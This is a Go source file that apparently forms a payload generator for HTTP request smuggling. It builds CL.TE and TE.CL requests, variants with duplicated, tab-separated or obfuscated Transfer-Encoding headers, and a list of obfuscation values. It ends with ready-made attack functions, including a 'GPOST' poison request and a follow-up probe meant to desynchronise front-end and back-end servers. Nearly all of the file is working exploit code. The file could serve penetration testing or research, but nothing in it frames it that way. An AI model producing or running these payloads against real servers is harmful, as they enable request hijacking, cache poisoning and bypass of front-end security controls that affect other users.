package payload

import (
    "fmt"
    "sort"
    "strconv"
    "strings"
)

// ---------- Generator ----------

type Generator struct {
    host    string
    port    int
    method  string
    path    string
    headers map[string]string
}

func NewGenerator(host string, port int) *Generator {
    return &Generator{
        host:    host,
        port:    port,
        method:  "GET",
        path:    "/",
        headers: make(map[string]string),
    }
}

func (g *Generator) SetMethod(method string) *Generator {
    g.method = method
    return g
}

func (g *Generator) SetPath(path string) *Generator {
    g.path = path
    return g
}

func (g *Generator) AddHeader(key, value string) *Generator {
    g.headers[key] = value
    return g
}

func (g *Generator) buildBaseRequest() string {
    var buf strings.Builder

    buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", g.method, g.path))
    buf.WriteString(fmt.Sprintf("Host: %s:%d\r\n", g.host, g.port))

    // deterministic header order
    keys := make([]string, 0, len(g.headers))
    for k := range g.headers {
        keys = append(keys, k)
    }
    sort.Strings(keys)

    for _, key := range keys {
        buf.WriteString(fmt.Sprintf("%s: %s\r\n", key, g.headers[key]))
    }

    return buf.String()
}

func (g *Generator) GenerateBaseline() string {
    var buf strings.Builder
    buf.WriteString(g.buildBaseRequest())
    buf.WriteString("Connection: close\r\n")
    buf.WriteString("\r\n")
    return buf.String()
}

// Convenience wrappers for Generator to create specific payloads.
func (g *Generator) GenerateCLTEPayload(smoggledBody string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }
    return GenerateCLTE(g.buildBaseRequest(), smoggledBody), nil
}

func (g *Generator) GenerateTECLPayload(smoggledBody string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }
    return GenerateTECL(g.buildBaseRequest(), smoggledBody), nil
}

func (g *Generator) GenerateObfuscatedTEPayload(smoggledBody string, obfuscation string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }
    if obfuscation == "" {
        return "", fmt.Errorf("obfuscation value cannot be empty")
    }
    return GenerateObfuscatedTE(g.buildBaseRequest(), smoggledBody, obfuscation), nil
}

// ---------- Helpers ----------

func buildChunkedPrefix() string {
    return "5\r\n0\r\n\r\n0\r\n\r\n"
}

// ---------- CL.TE ----------

func GenerateCLTE(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    body := buildChunkedPrefix() + smoggledBody

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
    buf.WriteString("\r\n")
    buf.WriteString(body)

    return buf.String()
}

func GenerateCLTEAmbiguous(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    body := buildChunkedPrefix() + smoggledBody

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: identity\r\n")
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
    buf.WriteString("\r\n")
    buf.WriteString(body)

    return buf.String()
}

// ---------- TE.CL ----------

func GenerateTECL(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    chunkBody := "0\r\n\r\n"

    buf.WriteString(baseRequest)
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(chunkBody)))
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(chunkBody)
    buf.WriteString(smoggledBody)

    return buf.String()
}

func GenerateTECLAmbiguous(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    chunkBody := "0\r\n\r\n"

    buf.WriteString(baseRequest)
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(chunkBody)))
    buf.WriteString("Transfer-Encoding:\tchunked\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(chunkBody)
    buf.WriteString(smoggledBody)

    return buf.String()
}

func GenerateTECLDualChunked(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    chunkBody := "0\r\n\r\n"

    buf.WriteString(baseRequest)
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(chunkBody)))
    buf.WriteString("Transfer-Encoding: identity\r\n")
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(chunkBody)
    buf.WriteString(smoggledBody)

    return buf.String()
}

// ---------- Obfuscated TE ----------

func GenerateObfuscatedTE(baseRequest string, smoggledBody string, obfuscation string) string {
    var buf strings.Builder

    body := buildChunkedPrefix() + smoggledBody

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", obfuscation))
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
    buf.WriteString("\r\n")
    buf.WriteString(body)

    return buf.String()
}

func GenerateObfuscatedTEVariant(baseRequest string, smoggledBody string, teHeaders []string) string {
    var buf strings.Builder

    body := buildChunkedPrefix() + smoggledBody

    buf.WriteString(baseRequest)
    for _, teValue := range teHeaders {
        buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", teValue))
    }
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
    buf.WriteString("\r\n")
    buf.WriteString(body)

    return buf.String()
}

var ObfuscationPatterns = []string{
    "cow",
    "x-chunked",
    "chunked;q=0.5",
    "zip",
    "deflate",
    "x-gzip",
    "identity",
    "*",
}

// ---------- Advanced attacks ----------

func CL_TE_GPOST_ATTACK(host string, port int) string {
    return "POST / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: keep-alive\r\n" +
        "Content-Type: application/x-www-form-urlencoded\r\n" +
        "Content-Length: 6\r\n" +
        "Transfer-Encoding: chunked\r\n" +
        "\r\n" +
        "0\r\n\r\nG"
}

func ProbeRequestAfterPoison(host string, port int) string {
    return "GET / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: close\r\n\r\n"
}

func HTTP1_CL_TE_Poison(host string, port int, poisonChar string) string {
    clValue := strconv.Itoa(len(poisonChar) + 5)
    return "POST / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: keep-alive\r\n" +
        "Content-Length: " + clValue + "\r\n" +
        "Transfer-Encoding: chunked\r\n" +
        "\r\n" +
        "0\r\n\r\n" +
        poisonChar
}
